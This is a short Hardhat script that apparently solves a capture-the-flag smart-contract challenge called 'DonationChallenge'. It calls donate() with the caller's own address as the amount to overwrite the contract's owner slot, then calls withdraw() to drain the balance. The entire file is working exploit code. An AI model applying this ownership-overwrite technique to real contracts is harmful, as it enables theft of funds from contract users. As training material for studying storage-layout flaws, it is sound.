async function main() {
    [owner] = await ethers.getSigners()
    Challenge = await ethers.getContractFactory('DonationChallenge');
    challenge = await Challenge.attach('0x6ffc306ac0d649ca13F35fb1FaBeed97E16D302A');

    addressNumber = ethers.BigNumber.from(owner.address);
    tx = await challenge.donate(addressNumber,{value:addressNumber.div(ethers.BigNumber.from('10').pow('36'))});
    await tx.wait();
    tx = await challenge.withdraw();
    await tx.wait();
}
main()
  .then(() => process.exit(0))
  .catch((error) => {
      console.error(error.message);
      process.exit(1);
  })